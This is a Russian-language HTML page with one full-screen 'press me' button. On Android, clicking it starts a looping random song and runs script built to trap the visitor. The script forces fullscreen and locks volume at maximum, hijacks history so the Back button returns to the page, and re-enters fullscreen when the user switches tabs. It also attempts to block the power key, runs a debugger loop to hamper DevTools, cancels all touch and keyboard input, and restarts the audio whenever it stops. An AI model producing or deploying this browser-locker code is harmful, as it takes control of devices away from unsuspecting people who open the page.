<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Плаки плаки</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { width: 100%; height: 100%; background: black; display: flex; justify-content: center; align-items: center; }
        #start { position: absolute; width: 100%; height: 100%; background: black; border: none; color: white; font-size: 24px; }
    </style>
</head>
<body>
    <button id="start">Нажми меня</button>
    <audio id="audio" loop>
        <source id="audioSource" type="audio/mpeg">
        Ваш браузер не поддерживает аудио.
    </audio>

    <script>
        const button = document.getElementById("start");
        const audio = document.getElementById("audio");
        const audioSource = document.getElementById("audioSource");
        const isAndroid = /Android/i.test(navigator.userAgent);

        // Массив с песнями
        const songs = ['audio1.mp3', 'audio2.mp3', 'audio3.mp3'];
        
        // Генерация случайного индекса для выбора песни
        const randomIndex = Math.floor(Math.random() * songs.length);
        
        // Устанавливаем случайную песню
        audioSource.src = songs[randomIndex];

        if (isAndroid) {
            button.addEventListener("click", async () => {
                await forceFullScreen();
                forceVolume();
                audio.play().catch((error) => {
                    console.error("Ошибка воспроизведения аудио:", error);
                });
                button.remove();
                blockExit();
                blockBackButton();
                blockTabSwitching();
                blockPowerButton();
                blockDevTools();
                blockGestures();
                blockKeyboard();
                blockTouch();
                ensureMusicNeverStops();
            });

            // Принудительный полноэкранный режим
            function forceFullScreen() {
                if (!document.fullscreenElement) {
                    return document.documentElement.requestFullscreen().catch(console.error);
                }
                return Promise.resolve();
            }

            // Принудительная громкость на максимум (в рамках браузера)
            function forceVolume() {
                audio.volume = 1.0;  // Максимальная громкость
                Object.defineProperty(audio, 'volume', {
                    get: () => 1.0,
                    set: () => {}
                });
            }

            // Блокировка выхода (кнопка "Назад" возвращает на сайт)
            function blockExit() {
                window.history.pushState(null, "", window.location.href);
                window.addEventListener("popstate", function() {
                    // Блокируем выход из полноэкранного режима
                    if (!document.fullscreenElement) {
                        document.documentElement.requestFullscreen().catch(console.error);
                    }
                    // Возвращаем пользователя на страницу
                    window.history.pushState(null, "", window.location.href);
                });
            }

            // Блокировка кнопки "Назад"
            function blockBackButton() {
                document.addEventListener("backbutton", (e) => {
                    e.preventDefault();
                }, false);
            }

            // Блокировка переключения вкладок
            function blockTabSwitching() {
                document.addEventListener("visibilitychange", () => {
                    if (document.hidden) {
                        document.documentElement.requestFullscreen();
                    }
                });
            }

            // Блокировка кнопки питания (попытка)
            function blockPowerButton() {
                document.addEventListener("keydown", (e) => {
                    if (e.key === "Power" || e.key === "Off") {
                        e.preventDefault();
                    }
                });
            }

            // Блокировка DevTools
            function blockDevTools() {
                setInterval(() => {
                    debugger;
                }, 100);
            }

            // Блокировка жестов (например, свайпов)
            function blockGestures() {
                document.addEventListener("touchmove", (e) => {
                    e.preventDefault();
                }, { passive: false });
            }

            // Блокировка клавиатуры (если подключена)
            function blockKeyboard() {
                document.addEventListener("keydown", (e) => {
                    e.preventDefault();
                });
            }

            // Блокировка касаний (делает экран нечувствительным)
            function blockTouch() {
                document.addEventListener("touchstart", (e) => {
                    e.preventDefault();
                }, { passive: false });

                document.addEventListener("touchend", (e) => {
                    e.preventDefault();
                }, { passive: false });

                document.addEventListener("touchcancel", (e) => {
                    e.preventDefault();
                }, { passive: false });
            }

            // Гарантия, что музыка никогда не остановится
            function ensureMusicNeverStops() {
                setInterval(() => {
                    if (audio.paused) {
                        audio.play().catch((error) => {
                            console.error("Ошибка воспроизведения аудио:", error);
                        });
                    }
                }, 100);
            }
        }

    </script>
</body>
</html>
